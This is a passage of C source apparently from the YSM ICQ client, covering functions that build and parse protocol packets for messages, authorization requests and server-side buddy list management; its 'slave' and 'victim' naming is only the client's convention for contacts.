     * being 0x19 (used only in scan requests). sorry :)
     * Oh, btw, the problem is that we cant send capabilities during scan.
     * If msgFlags are 0x19, we set them to 0x03 afterwards so it works.
     */

    /* capability -> 16 bytes */
    if (msgFlags != 0x19)
    {
        bsAppend(bsd, CAP_PRECAP, sizeof(CAP_PRECAP)-1);
        bsAppend(bsd, CAP_SRVRELAY, sizeof(CAP_SRVRELAY)-1);
        bsAppend(bsd, CAP_POSCAP, sizeof(CAP_POSCAP)-1);
    }
    else
    {
        bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16); /* empty capability */
    }
    
    bsAppendTlv(bsd, 0x0A, 2, NULL);        /* TLV 0x0A: Acktype2 */
    bsAppendWord(bsd, 0x01);
    bsAppendTlv(bsd, 0x0F, 0, NULL);        /* TLV 0x0F: unknown and empty */

    tlv2711 = bsAppendTlv(bsd, 0x2711, 0, NULL); /* TLV 0x2711: ext. data */

    bsAppendWordLE(bsd, 0x1B);                 /* length till sequence # */
    bsAppendWordLE(bsd, YSM_PROTOCOL_VERSION); /* TCP protocol version */
    bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16); /* empty capability */
    bsAppendWord(bsd, 0x00);                /* unknown */
    bsAppendByte(bsd, 0x03);
    bsAppendDword(bsd, 0x00);               /* msg global type */
    bsAppendWordLE(bsd, 0x00);              /* sequence # */
    bsAppendWordLE(bsd, 0x0E);              /* unknown length */
    bsAppendWordLE(bsd, 0x00);              /* sequence # */
    bsAppend(bsd, "\0\0\0\0\0\0\0\0\0\0\0\0", 12); /* unknown */

    /*** scan fix, read above ****/
    if (msgFlags == 0x19) msgFlags = 0x03;

    bsAppendByte(bsd, msgType);             /* msgType */
    bsAppendByte(bsd, msgFlags);
    bsAppendWordLE(bsd, 0x0000);            /* status code */

    if (victim->status == STATUS_DND)
        bsAppendWordLE(bsd, 0x04);
    else
        bsAppendWordLE(bsd, 0x21);          /* priority */

    bsAppendWordLE(bsd, msgLen + 1);        /* message stringz length */
    bsAppend(bsd, msgData, msgLen);      /* message string */
    bsAppendByte(bsd, 0x00);                /* null-terminator */

    if (sendFlags & MFLAGTYPE_NORM)         /* do we have to insert colors? */
    {
        bsAppendDwordLE(bsd, 0x00000000);   /* text color (rgbn) */
        bsAppendDwordLE(bsd, 0xFFFFFF00);   /* background color (rgbn) */
    }

    /* do we have to insert a GUID? */
    if (sendFlags & MFLAGTYPE_RTF)
    {
        bsAppendDword(bsd, sizeof(CAP_RTF_GUID)-1);
        bsAppend(bsd, CAP_RTF_GUID, sizeof(CAP_RTF_GUID)-1);
    }
    else if (sendFlags & MFLAGTYPE_UTF8)
    {
        bsAppendDword(bsd, sizeof(CAP_UTF8_GUID)-1);
        bsAppend(bsd, CAP_UTF8_GUID, sizeof(CAP_UTF8_GUID)-1);
    }

    bsUpdateTlvLen(bsd, tlv2711);
    bsUpdateTlvLen(bsd, tlv5);
}

void bsAppendMessageBodyType4(
    bsd_t     bsd,
    int8_t   *msgData,
    int32_t   msgLen,
    int32_t   msgType,
    uint8_t  msgFlags)
{
    bs_pos_t  tlv5;

    tlv5 = bsAppendTlv(bsd, 0x05, 0, NULL); /* TLV 0x05: message data */
    bsAppendDwordLE(bsd, YSM_USER.uin);     /* sender uin */
    bsAppendByte(bsd, msgType);             /* message type */
    bsAppendByte(bsd, msgFlags);            /* message flags */
    bsAppendByte(bsd, msgLen + 1);          /* message stringz len */
    bsAppend(bsd, msgData, msgLen);      /* message string */
    bsAppendByte(bsd, 0x00);                /* null-terminator */
    bsUpdateTlvLen(bsd, tlv5);
}

void forwardMessage(uin_t uin, char *inMsg)
{
    int8_t outMsg[MAX_DATA_LEN];

    snprintf(outMsg, sizeof(outMsg), "<%d> %s", (int)uin, inMsg);

    sendMessage(g_cfg.forward, outMsg, TRUE);
}

void sendAuthReq(uin_t uin, uint8_t *nick, uint8_t *message)
{
    bsd_t bsd;

    if (message == NULL)
        message = YSM_DEFAULT_AUTHREQ_MESSAGE;

    bsd = initBs();
    bsAppendPrintfString08(bsd, "%ld", uin);    /* uin string08 */
    bsAppendPrintfString16(bsd, "%s", message); /* reason message string16 */
    bsAppendWord(bsd, 0);                       /* unknown word */

    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_AUTH_REQ, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++, 0);

    printfOutput(VERBOSE_BASE, "OUT AUTH_REQ %ld %s\n",
        uin,
        nick ? nick : NOT_A_SLAVE);

    freeBs(bsd);
}

void sendAuthRsp(uin_t uin, uint8_t *nick)
{
    bsd_t bsd;

    bsd = initBs();

    bsAppendPrintfString08(bsd, "%ld", uin); /* uin string08 */
    bsAppendByte(bsd, 0x01);                 /* flag: 1-accept, 2-decline */
    bsAppendDword(bsd, 0x00);                /* empty reason string16 */
    bsAppendDword(bsd, 0x00);                /* Extra Flags (Usually 0x0000) */

    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_AUTH_RSP, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++, 0);

    printfOutput(VERBOSE_BASE, "OUT AUTH_RSP %ld %s\n",
         uin,
         nick ? nick : NOT_A_SLAVE);

    freeBs(bsd);
}

void YSM_SendContacts(void)
{
    slave_t  *slave = NULL;
    bsd_t     bsd;

    bsd = initBs();
    
    while (slave = getNextSlave(slave))
    {
        bsAppendPrintfString08(bsd, "%ld", (int)slave->uin);
    }

    sendSnac(YSM_BUDDY_LIST_SNAC, YSM_CLI_ADD_BUDDY, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}

/* removes buddy from your client-side contact list during session */

void sendRemoveContactReq(uin_t uin)
{
    bsd_t bsd;

    bsd = initBs();
    bsAppendPrintfString08(bsd, "%ld", uin);

    sendSnac(YSM_BUDDY_LIST_SNAC, YSM_CLI_REMOVE_BUDDY, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++,
        0);

    freeBs(bsd);
}


/* If a buddy is stored in the server, change his/her            */
/* type to our Ignore list so they don't fuck with us no M0re y0!    */
void YSM_BuddyIgnore(slave_t *buddy, int flag)
{
    if (flag)    /* Add to Ignore list */
    {
        buddy->budType.ignoreId = YSM_BuddyAddItem(buddy,
            YSM_BUDDY_GROUPNAME,
            0x0,
            0x0,
            YSM_BUDDY_SLAVE_IGN,
            0, 0, CLI_SSI_ADD);
    }
    else        /* Remove from the Ignore list */
    {
        YSM_BuddyAddItem(buddy,
            YSM_BUDDY_GROUPNAME,
            0x0,
            buddy->budType.ignoreId,
            YSM_BUDDY_SLAVE_IGN,
            0, 0, CLI_SSI_REMOVE);

        /* Reset the Ignore Flag */
        buddy->budType.ignoreId = 0;
    }

    YSM_BuddyRequestFinished();
}


/* If a buddy is stored in the server, change his/her    */
/* type to our block/invisible list so they wont see us  */
void YSM_BuddyInvisible(slave_t *buddy, int flag)
{
    if (flag)    /* Add to invisible list */
    {
        buddy->budType.invisibleId = YSM_BuddyAddItem(
            buddy,
            YSM_BUDDY_GROUPNAME,
            0x0,
            0x0,
            YSM_BUDDY_SLAVE_INV,
            0, 0, CLI_SSI_ADD);
    }
    else        /* Remove from the invisible list */
    {
        YSM_BuddyAddItem(buddy,
            YSM_BUDDY_GROUPNAME,
            0x0,
            buddy->budType.invisibleId,
            YSM_BUDDY_SLAVE_INV,
            0, 0, CLI_SSI_REMOVE);

        /* Reset the Invisible Flag */
        buddy->budType.invisibleId = 0;
    }

    YSM_BuddyRequestFinished();
}


/* If a buddy is stored in the server, change his/her    */
/* type to our Allow/Visible list so they see us when we drink     */
/* the magic potion */
void YSM_BuddyVisible(slave_t *buddy, int flag)
{
    if (flag)    /* Add to the Visible list */
    {
        buddy->budType.visibleId = YSM_BuddyAddItem( buddy,
            YSM_BUDDY_GROUPNAME,
            0x0,
            0x0,
            YSM_BUDDY_SLAVE_VIS,
            0, 0, CLI_SSI_ADD);
    }
    else        /* Remove from the Visible list */
    {
        YSM_BuddyAddItem(buddy,
            YSM_BUDDY_GROUPNAME,
            0x0,
            buddy->budType.visibleId,
            YSM_BUDDY_SLAVE_VIS,
            0, 0, CLI_SSI_REMOVE);

        /* Reset the Visible Flag */
        buddy->budType.visibleId = 0;


    }

    YSM_BuddyRequestFinished();
}

static void buddyAddSlave(
    uint8_t  *nick,
    uin_t     uin,
    uint16_t  budId,
    uint16_t  grpId,
    uint16_t  type)
{
    slave_t *new = NULL;

//    DEBUG_PRINT("%s (#%ld)", nick, uin);

    new = addSlaveToList(nick, uin, FL_DOWNLOADED, NULL, budId, grpId, type);

    if (new != NULL)
        addSlaveToDisk(new);
}


/* BuddyDelSlave - removes a slave from the server-side contact list.
 */

void YSM_BuddyDelSlave(slave_t *contact)
{
    if (contact == NULL)
        return;

    printfOutput(VERBOSE_MOATA,
        "INFO REMOVE_SRV %dl %s with budid: %x "
        "and groupd id: %x\n",
        contact->uin,
        contact->info.nickName,
        contact->budType.budId,
        contact->budType.grpId);

    YSM_BuddyAddItem(contact,
        YSM_BUDDY_GROUPNAME,
        contact->budType.grpId,
        contact->budType.budId,
        YSM_BUDDY_SLAVE,
        0,               /* cmd */
        0,               /* auth */
        CLI_SSI_REMOVE); /* remove! */
}

void YSM_BuddyRequestModify(void)
{
    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_EDIT_BEGIN, 0x0,
             NULL, 0, g_sinfo.seqnum++, 0x11);
}

void YSM_BuddyRequestFinished(void)
{
    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_EDIT_END, 0x0,
             NULL, 0, g_sinfo.seqnum++, 0x12);
}

void YSM_BuddyAck(void)
{
    sendSnac(YSM_ICQV8FUNC_SNAC, CLI_SSI_ACTIVATE, 0x0,
             NULL, 0, g_sinfo.seqnum++, 0);
}

/* This function goes through the list of slaves that have */
/* the downloaded flag on, searching for the biggest budId */
/* once it finds it, it increments the id by 1 and returns */

static int YSM_BuddyGenNewID(void)
{
    int32_t  newId = 0;
    slave_t *slave = NULL;

    while (slave = getNextSlave(slave))
    {
         if (slave->budType.budId > newId)
             newId = slave->budType.budId;
    }

    newId++;

    return newId;
}

/*
 hehe nice function huh :) well use is this way:

    For adding a Group:
        Item = 0x0, grpName = groupname
        grpID = groupID, budID = 0x0, type = YSM_BUDDY_GROUP
    For adding a Buddy:
        Iteme= slave_t*, grpName = groupname
        grpID = groupID, budID = UIN(int), type = YSM_BUDDY_SLAVE

    the function returns the buddy ID.
*/

/* YSM_BuddyAddItem
 *    if CMD == 0, then ADD ITEM
 *    if CMD == 1, then NOTIFY MASTER
 *
 *    if add_update == CLI_SSI_ADD then ADD
 *    if add_update == CLI_SSI_REMOVE then REMOVE
 *
 *    bID holds a buddy ID. if bID == 0, GENERATE ID
 */

int32_t YSM_BuddyAddItem(
    slave_t    *victim,
    uint8_t    *grpName,
    uint16_t    grpId,
    uint16_t    bID,
    uint32_t    type,
    uint8_t     cmd,
    uint8_t     authAwait,
    uint8_t     subTypeId)
{
    uint8_t     sUIN[MAX_UIN_LEN+1];
    uint8_t    *name = NULL;
    int32_t    *dataListAmount = NULL, buddyId = 0;
    uint32_t    reqId;
    bsd_t       bsd;
    bsd_t       dataList;
    bs_pos_t    addlDataLen;

    if (victim == NULL || grpName == NULL)
        return -1;

    bsd = initBs();

    /* We increment the change count on our buddy list for future chgs */
    g_sinfo.blentries++;

    YSM_BuddyRequestModify();

    if (type == YSM_BUDDY_GROUP)
    {
        /* for notifying master */
        dataList = g_sinfo.blgroupsid;
        dataListAmount = &g_sinfo.blgroupsidentries;
        name = grpName;
    }
    else
    {
        memset(sUIN, 0, sizeof(sUIN));
        snprintf(sUIN, MAX_UIN_LEN+1, "%d", (int)victim->uin);
        name = &sUIN[0];

        /* for notifying master */
        dataList = g_sinfo.blusersid;
        dataListAmount = &g_sinfo.blusersidentries;
    }

    /* We are creating this buddy for the first time, don't
     * generate a new random ID for already created ids  */
    if (type != YSM_BUDDY_GROUP)
    {
        /* bID is a param to this function
         * usually used for invisible, visible and ignore
         */

        if (!bID)
        {
            if (subTypeId == CLI_SSI_ADD)
            {
                buddyId = YSM_BuddyGenNewID();
                victim->budType.budId = buddyId;
            }
            else
                buddyId = victim->budType.budId;
        }
        else
            buddyId = bID;
    }

    reqId = subTypeId | ((g_sinfo.blentries & 0xFF) << 16);

    switch (cmd)
    {
        /* Called first time, add items */
        case 0:
            bsAppendPrintfString16(bsd, "%s", name);    /* item name string16 */
            bsAppendWord(bsd, grpId);                   /* group id # */
            bsAppendWord(bsd, type == YSM_BUDDY_GROUP   /* item id # */
                ? 0                                     /* grp item ids are 0 */
                : buddyId);                             /* adding a buddy */
            bsAppendWord(bsd, type);                    /* item type */
            addlDataLen = bsAppendWord(bsd, 0);         /* addl data len */
            
            if (type == YSM_BUDDY_GROUP)
            {
                g_sinfo.blysmgroupid = reqId;
            }
            else        /* which would be YSM_BUDDY_SLAVE or..etc */
            {
                /* and now if we are adding a Buddy add on additional data
                 * its Nickname */

                /* TLV 0x131: stores the name that the contact should show up
                 * as in the contact list*/
                bsAppendTlv(bsd, 0x131, strlen(victim->info.nickName),
                    victim->info.nickName);

                /* TLV 0x66: signifies that you are awaiting authorization
                 * for this buddy */
                if (authAwait)
                    bsAppendTlv(bsd, 0x66, 0, NULL);

                /* fill the slave's reqid, so we then know whos who */
                victim->reqId = reqId;
            }

            bsUpdateWordLen(bsd, addlDataLen);
            break;

        /* Generating change on Master Group */
        case 0x1:
            /* Either Master group of groups or Group of Buddies! */

            (*dataListAmount)++;    /* New GroupID ! */

            if (type == YSM_BUDDY_GROUP)
            {
                /* Group! */
                bsAppendWord(bsd, 0);       /* item name: empty string16 */
                bsAppendWord(bsd, 0);       /* group id# (0 - master group) */
            }
            else
            {
                /* Buddy! */
                bsAppendPrintfString16(bsd, "%s", grpName); /* item name string16 */
                bsAppendWord(bsd, grpId);                   /* group id# */
            }

            /* For Both, a new Group or Buddy, the item id# must be 0 and
             * the type must be 0001 since what we are changing here is in
             * both cases a group */

            bsAppendWord(bsd, 0);                       /* item id# (0 - group) */
            bsAppendWord(bsd, 0x01);                    /* item type */
            addlDataLen = bsAppendWord(bsd, 0);         /* addl data len */

            /* add the new Group id if adding a group or user id
             * if adding a user */

            if (type == YSM_BUDDY_GROUP)
                bsAppendWord(dataList, grpId);
            else
            {
                bsAppendWord(dataList, buddyId);
                /* fill the slave's reqid, so we then know whos who */
                victim->reqId = reqId;
            }

            bsAppendTlv(bsd, 0xC8, bsGetLen(dataList), bsGetBuf(dataList));
            bsUpdateWordLen(bsd, addlDataLen);
            break;

        default:
            YSM_ERROR(ERROR_CODE, 1);
            return -1;
            break;
    }

    sendSnac(0x13, subTypeId, 0x0,
        bsGetBuf(bsd),
        bsGetLen(bsd),
        g_sinfo.seqnum++, reqId);

    freeBs(bsd);
    return buddyId;
}

static void YSM_BuddyCreateGroup(void)
{
    /* We initialized the Amount variable to -1, if the group existed while
     * we read the Buddy List but it was empty, we sat 0x0 as its value.
     * (which means no need to create) */

    if (g_sinfo.blusersidentries < 0)
    {
        printfOutput(VERBOSE_MOATA,
            "INFO CREATING YSM Group, doesn't exist!..\n");

        YSM_BuddyAddItem(0x0,
            YSM_BUDDY_GROUPNAME,
            YSM_BUDDY_GROUPID,
            0x0,
            YSM_BUDDY_GROUP,
            0,
            0,
            CLI_SSI_ADD);

        g_sinfo.blusersidentries = 0;
    }
}

void YSM_BuddyUploadList(slave_t *refugee)
{
    slave_t *slave = NULL;
    int      count = 0;

    YSM_BuddyCreateGroup();

    if (refugee != NULL)
    {
        if (!IS_DOWNLOADED(refugee))
        {
            YSM_BuddyAddItem(refugee,
                YSM_BUDDY_GROUPNAME,
                YSM_BUDDY_GROUPID,
                0x0,
                YSM_BUDDY_SLAVE,
                0,
                0,
                CLI_SSI_ADD);
        }
        else
            printfOutput(VERBOSE_BASE,
                "INFO The slave is already stored online.\n");

        return;
    }

    while (slave = getNextSlave(slave))
    {
        if (count >= MAX_SAVE_COUNT)
            break;

        if (!IS_DOWNLOADED(slave))
        {
            YSM_BuddyAddItem(
                slave,
                YSM_BUDDY_GROUPNAME,
                YSM_BUDDY_GROUPID,
                0x0,
                YSM_BUDDY_SLAVE,
                0x0,
                0x0,
                CLI_SSI_ADD);

            count++;
        }
    }

    printfOutput(VERBOSE_BASE,
        "Please wait until %d results show up (or the few left).\n",
        MAX_SAVE_COUNT);

    printfOutput(VERBOSE_BASE,
        "INFO Use 'save' again to upload the missing slaves "
        "in groups of %d.\n", MAX_SAVE_COUNT);

    if (!count)
        printfOutput(VERBOSE_BASE,
            "-- done with ALL SLAVES" ".\n"
             "Use the 'req' command for those who require auth.\n");
}


void buddyReadSlave(char *buf)
{
    uint16_t  uinLen = 0, xtralen = 0;
    int8_t   *uin = NULL;
    int8_t   *nick = NULL;
    uint16_t  budId, grpId, budType;
    tlv_t     tlv;

    READ_UINT16(&uinLen, buf);
    if (uinLen <= 0 || uinLen > MAX_UIN_LEN)
        return;

    uin = YSM_CALLOC(1, uinLen+1);
    READ_STRING(uin, buf, uinLen);  /* UIN */
    READ_UINT16(&grpId, buf);       /* group Id */
    READ_UINT16(&budId, buf);       /* buddy Id */
    READ_UINT16(&budType, buf);     /* buddy type */

    /* There are different types of buddies
     * Some maybe be on our ignore list, some on our invisible list, etc */

    READ_UINT16(&xtralen, buf);

//    hexDumpOutput(buf, xtralen);

    /* We just care about the 0x131 which is the Nick of our slave.
     * 0x66 and other tlvs are ignored, why would we want em huh HUH =P */

    while (xtralen > 0)
    {
        READ_TLV(&tlv, buf);

        switch (tlv.type)
        {
            /* Which means Extra Data Nick Incoming! */
            case 0x131:
                nick = YSM_CALLOC(1, tlv.len+1);
                readString(nick, buf, tlv.len);
                break;

            /* Awaiting auth from this slave */
            case 0x66:
                DEBUG_PRINT("awaiting authorization from %s", uin);
                break;

            /* Fine, no Nick found then */
            default:
                break;
        }

        buf += tlv.len;
        xtralen -= sizeof(tlv_bit_t) + tlv.len;
    }

    if (nick != NULL)
    {
        YSM_CharsetConvertString(&nick, CHARSET_INCOMING, MFLAGTYPE_UTF8, TRUE);
        if (YSM_ParseSlave(nick) == 0)
        {
            YSM_FREE(nick);
        }
    }

    if (nick == NULL)
    {
        /* God Damn! No nick for this slave! What shall we use?! */
        /* Fine god dammit! Lets use its UIN # as his nickname! */

        nick = YSM_CALLOC(1, uinLen+1);
        strncpy(nick, uin, uinLen);
    }

    /* debugging info */
    printfOutput(VERBOSE_SDOWNLOAD, "INFO ADDING %s %s\n", uin, nick);

    buddyAddSlave(nick, atol(uin), budId, grpId, budType);

    YSM_FREE(uin);
    YSM_FREE(nick);
}

void YSM_BuddyIncomingChange(snac_head_t *snac, bsd_t bsd)
{
    slave_t   *slave = NULL;
    uint16_t   incomingReq;

    if (getNextSlave(slave) == NULL)
        return;

    bsReadWord(bsd, &incomingReq);

    /* Maybe its the ack for our group creation..*/
    /* If so.. */
    if (snac->reqId == g_sinfo.blysmgroupid)
    {
        YSM_BuddyAddItem(0x0,
            YSM_BUDDY_GROUPNAME,
            YSM_BUDDY_GROUPID,
            0x0,
            YSM_BUDDY_GROUP,
            1,
            0,
            CLI_SSI_UPDATE);

        printfOutput(VERBOSE_MOATA,"\n" MSG_BUDDY_GROUPCREATED "\n");

        /* Let it know it can close the contact list */
        YSM_BuddyRequestFinished();

        return;
    }

    while (slave = getNextSlave(slave))
    {
        if (snac->reqId == slave->reqId)
    	{
            /* If its the Group added ack, just break */
            if (IS_DOWNLOADED(slave))
                break;

            switch (incomingReq)
    		{
                case YSM_SRV_BUDDY_NOAUTH:
                    /* Ok! Been acked. Notify the YSM group that
                       it's got a new user. */

                    printfOutput(VERBOSE_BASE,
                        "\n" MSG_BUDDY_SAVING1 "%s"
                        MSG_BUDDY_SAVING2 "%d"
                        MSG_BUDDY_SAVING3,
                        slave->info.nickName,
                        slave->uin);

                    YSM_BuddyAddItem(slave,
                        YSM_BUDDY_GROUPNAME,
                        YSM_BUDDY_GROUPID,
                        0x0, /* new */
                        YSM_BUDDY_SLAVE, 1, 0,
                        CLI_SSI_UPDATE);

                    /* Set the -online- contact flag so we can then
                       know who required auth and who did not */

                    printfOutput(VERBOSE_BASE, "INFO SLAVE_SAVED\n");
                    slave->flags |= FL_DOWNLOADED;
                    break;

                case YSM_SRV_BUDDY_AUTH:
                    /* This slave requires an online auth..ugh. */

                    /* Let the user know he needs auth from the
                        other part in order to add it in the list */

                    printfOutput(VERBOSE_BASE,
                        "\n" MSG_BUDDY_SAVING1 "%s"
                        MSG_BUDDY_SAVING2 "%d"
                        MSG_BUDDY_SAVING3,
                        slave->info.nickName,
                        slave->uin);

                    printfOutput(VERBOSE_BASE,
                        MSG_BUDDY_SAVINGAUTH "\n" 
                        MSG_BUDDY_SAVINGAUTH2
                        MSG_BUDDY_SAVINGAUTH3 "\n");

                    slave->flags |= FL_DOWNLOADED;
                    slave->flags |= FL_AUTHREQ;
                    break;

                case YSM_SRV_BUDDY_ERRADD:
                    printfOutput(VERBOSE_BASE,
                        "ERR SLAVE_SAVE Maybe adding a disabled account?\n");

                    slave->flags |= FL_DOWNLOADED;
                    break;

                /* Shouldn't happend. Take same action as if
                   a reply for a non-slave arrives, ignore! */

                default:
                    /*
                        Bleh, don't let the user know about this ;P

                        printfOutput(VERBOSE_BASE,
                         " [WARNING]\n" 
                        "Try Again!.\n");

                        Just retry.
                    */
                    printfOutput(VERBOSE_MOATA, "INFO Dijo WARNING\n");

                    YSM_BuddyAddItem(slave,
                        YSM_BUDDY_GROUPNAME,
                        YSM_BUDDY_GROUPID,
                        0x0, /* new */
                        YSM_BUDDY_SLAVE,
                        0, 0, CLI_SSI_ADD);
                    break;
            }

            /* Let it know it can close the contact list */
            YSM_BuddyRequestFinished();
        }
    }
}

void YSM_BuddyIncomingList(bsd_t bsd)
{
    uint16_t   groupId, dataLen, itemId, itemType, itemsCount;
    int8_t    *itemName;
    int8_t    *itemStartPtr;
    int8_t    *ptr = buf;
    int32_t    len2 = 0, GrpSlaves = 0, y = 0;
    int32_t    r = 0, maxdlen = 0, g_amount = 0;
    tlv_t      tlv;

    DEBUG_PRINT("");

    ptr++; /* SSI protocol version (!?) */

    /* Amount of modifications by now (We need this for future mods) */
    READ_UINT16(&itemsCount, ptr);

    /* For future changes, we mark our next change already */
    g_sinfo.blentries = itemsCount + 1;

    DEBUG_PRINT("itemsCount = %d", itemsCount);

    /* DAMN! Parse the items and get to the GROUPS! */
    for (; itemsCount > 0; itemsCount--)
    {
        itemStartPtr = ptr;
        READ_UINT16(&dataLen, ptr);         /* length of the item name */
        if (dataLen > 0)
        {
            itemName = YSM_CALLOC(1, dataLen+1);
            READ_STRING(itemName, ptr, dataLen);
//            DEBUG_PRINT("itemName: %s (%d)", itemName, itemsCount);
            YSM_FREE(itemName);
        }
//        ptr += dataLen;                    /* skip the item name string */

        READ_UINT16(&groupId, ptr);
        READ_UINT16(&itemId, ptr);
        READ_UINT16(&itemType, ptr);
        READ_UINT16(&dataLen, ptr);

        if (groupId == 0 && itemId == 0)
        {
            /* This is a master group */

            g_sinfo.flags |= FL_DOWNLOADEDSLAVES;

            while (0 != dataLen)
            {
                READ_TLV(&tlv, ptr);

                /* The Groups listing did show up, skip it! dammit! */
                if (tlv.type == 0xC8)
                {
                    /* Make a global allocated area where to store
                       the existing GroupIDS */

                    bsAppend(g_sinfo.blgroupsid, ptr, tlv.len);
                    g_sinfo.blgroupsidentries = tlv.len/2;
                }

                ptr += tlv.len;

                /* this should set dataLen to 0 if there is no more data */
                dataLen -= sizeof(tlv_bit_t) + tlv.len;
            }
        }
        else if (itemId == 0)
        {
            /* A group */

            if (dataLen == 0)
            {
                /* Empty group, but check if it is OUR group so we don't
                 * make the mistake of creating it twice! */
                if (groupId == YSM_BUDDY_GROUPID)
                {
                    g_sinfo.blusersidentries = 0;
                }
                continue;
            }

            while (dataLen != 0)
            {
                READ_TLV(&tlv, ptr);

                switch (tlv.type)
                {
                    /* Users ID */
                    /* Use the amm of IDS for knowing the amm */
                    /* of slaves in the group */
                    case 0xC8:
                        /* If its the YSM Group, we need the list of Buddy */
                        /* Ids stored in our users list. */
                        if (groupId == YSM_BUDDY_GROUPID)
                        {
                            if (tlv.len != 0)
                            {
                                bsAppend(g_sinfo.blusersid, ptr, tlv.len);
                                g_sinfo.blusersidentries = tlv.len/2;
                            }
                            else
                            {
                                /* The Group exists, but its empty.
                                   Do NOT re-create the group! */
                                g_sinfo.blusersidentries = 0;
                            }
                        }

                        GrpSlaves = tlv.len/2;
                        break;

                    default:
                        GrpSlaves = 0;
                        break;
                }

                ptr += tlv.len;
                dataLen -= sizeof(tlv_bit_t) + tlv.len;
            }
        }
        else
        {
            /* If it wasn't a group, it might be a slave */
            /* in a special status (visible, invisible, ignore) */
            /* or without a group, yes its possible fuckn srv */

//            DEBUG_PRINT("itemType: %d", itemType);

            switch (itemType)
            {
                case YSM_BUDDY_SLAVE:
                case YSM_BUDDY_SLAVE_INV:
                case YSM_BUDDY_SLAVE_IGN:
                case YSM_BUDDY_SLAVE_VIS:
                    buddyReadSlave(itemStartPtr);
                    g_amount++;
                    break;

                case 0x0004:
                    /* Permit/deny settings or/and bitmask of the
                     * AIM classes */

                    /* Check if its our Privacy Settings */
                    g_sinfo.blprivacygroupid = itemId;

                    /* Check the current setting. */
                    /* If we left invisible, change the status */
                    /* to invisible again. */
                    /* If we WANT invisible, turn to invisible 2 */
                    if (*(ptr+4+2+sizeof(tlv_bit_t)) == 0x2
                    || *(ptr+4+2+sizeof(tlv_bit_t)) == 0x3
                    || YSM_USER.status == STATUS_INVISIBLE)
                    {
                        YSM_ChangeStatus(STATUS_INVISIBLE);
                    }
                    break;

                default:
                    ;
            }

            ptr += dataLen;
        }
    }

    /* Print some shocking message :) New slaves are always welcome. */
    printfOutput(VERBOSE_BASE,
        "INFO d[O_o]b %d %s\n", g_amount, MSG_DOWNLOADED_SLAVES);

    YSM_BuddyAck();
}

void YSM_IncomingMultiUse(flap_head_bit_t *head, snac_head_t *snac, char *buf)
{
    uin_t      uin = 0;
    uint16_t   dataLen = 0;
    uint16_t   reqId;
    uint16_t   rspType;
    uint16_t   rspSubType;
    int8_t     result;
    uint8_t    msgType = 0;
    int8_t     m_flags;
    int8_t     o_month = 0, o_day = 0, o_hour = 0, o_minutes = 0;
    uint16_t   msgLen;
    slave_t   *victim = NULL;
    tlv_t      tlv;
    int8_t    *ptr = buf;

    DEBUG_PRINT("");

    /* its a TLV(1) at the very beggining, always. */
    READ_TLV(&tlv, ptr);
    READ_UINT16LE(&dataLen, ptr);

    ptr += 4; /* skip my UIN */
    READ_UINT16LE(&rspType, ptr);
    READ_UINT16LE(&reqId, ptr);

    switch (rspType)
    {
        /* Information request response */
        case 0x07DA:
            READ_UINT16LE(&rspSubType, ptr);
            READ_UINT8(&result, ptr);
            if (result != 0x32 && result != 0x14 && result != 0x1E)
            {
                switch (rspSubType)
                {
                    /* Incoming MAIN info */
                    case 0xC8:
                        YSM_IncomingInfo(INFO_MAIN, ptr, 0, snac->reqId);
                        break;

                    /* incoming full info */
                    case 0xDC:
                        YSM_IncomingInfo(INFO_HP, ptr, 0, snac->reqId);
                        break;

                    case 0xD2:
                        YSM_IncomingInfo(INFO_WORK, ptr, 0, snac->reqId);
                        break;

                    case 0xE6:
                        YSM_IncomingInfo(INFO_ABOUT, ptr, 0, snac->reqId);
                        break;

                    case 0xA4:
                    case 0xAE:
                        YSM_IncomingSearch(ptr, 0);
                        break;

                    case 0x64:
                        printfOutput(VERBOSE_BASE, "INFO " MSG_INFO_UPDATED "\n");
                        break;

                    case 0xAA:
                        printfOutput(VERBOSE_BASE, "INFO Password changed.\n");
                        break;

                    default:
                        break;
                }
            }
            break;

        /* Offline message response */
        case 0x0041:
            READ_UINT32LE(&uin, ptr);    /* uin LE */
            ptr += 2;                    /* skip WORD (year) */
            READ_UINT8(&o_month, ptr);   /* month */
            READ_UINT8(&o_day, ptr);     /* day */
            READ_UINT8(&o_hour, ptr);    /* hour */
            READ_UINT8(&o_minutes, ptr); /* minutes */
            READ_UINT8(&msgType, ptr);   /* message type */
            READ_UINT8(&m_flags, ptr);   /* message flags */
            READ_UINT16(&msgLen, ptr);   /* message string length */

            victim = querySlave(SLAVE_UIN, NULL, uin, 0);

            printfOutput(VERBOSE_BASE,
                "\n" MSG_NEW_OFFLINE "\n"
                "[date: %.2d/%.2d time: %.2d:%.2d (GMT):\n",
                o_day,
                o_month,
                o_hour,
                o_minutes);

            /* offline message */
            YSM_ReceiveMessageData(victim, uin, 0, msgType, 0x00, msgLen, ptr);
            break;

        /* end of offline msgs */
        case 0x0042:
            sendDeleteOfflineMsgsReq();
            break;

        default:
            DEBUG_PRINT("unknown respond type 0x%X!", rspType);
            break;
    }
}

void YSM_IncomingSearch(char *buf, int tsize)
{
    char      *data = NULL;
    uint16_t  dataLen = 0;
    uin_t      ruin = 0;
    int8_t    *ptr = buf + tsize;

    ptr += 2;    /* skip record LEN */
    memcpy(&ruin, ptr, 4);
    ptr += 4;

    READ_UINT16(&dataLen, ptr);
    data = YSM_CALLOC(1, dataLen+1);
    READ_STRING(data, ptr, dataLen);

    printfOutput(VERBOSE_BASE, "INFO SEARCH %ld %s\n", ruin, data);

    YSM_FREE(data);
}


void YSM_IncomingPersonal(flap_head_bit_t *head, int8_t *buf)
{
    int32_t    x = 0, len = 0;
    int8_t    *aux = NULL;

    /* uin len */
    len = buf[0];
    x++;

    x += len;
    x += 4;

    while (x < (Chars_2_Wordb(head->dlen) - SNAC_HEAD_SIZE))
    {
